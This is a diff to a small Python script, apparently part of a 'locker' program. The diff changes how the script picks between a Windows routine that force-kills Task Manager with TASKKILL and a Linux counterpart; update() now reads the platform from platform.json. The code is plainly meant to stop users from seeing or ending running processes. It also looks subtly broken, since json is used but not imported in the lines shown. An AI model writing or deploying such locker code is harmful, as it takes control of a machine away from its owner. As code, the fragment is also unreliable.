@@ -1,9 +1,6 @@
 import os
 import platform
 
-flag_windows = False
-flag_linux = False
-
 def windows():
     taskkill_cmd = "TASKKILL /F /IM taskmgr.exe"
     os.system(taskkill_cmd)
@@ -29,10 +26,11 @@ def start():
         print("os system --> Linux")
 
 def update():
-    if flag_linux:
-        linux() #locker
-        print("top locked.")
-    elif flag_windows:
-        windows() #locker
-        print("task manager locked.")
-
+    with open("platform.json", "r") as pl:
+        j = json.load(pl)
+        j = j["platform"]
+        pl.close()
+    if j == "Windows":
+        windows()
+    elif j == "Linux":
+        linux()
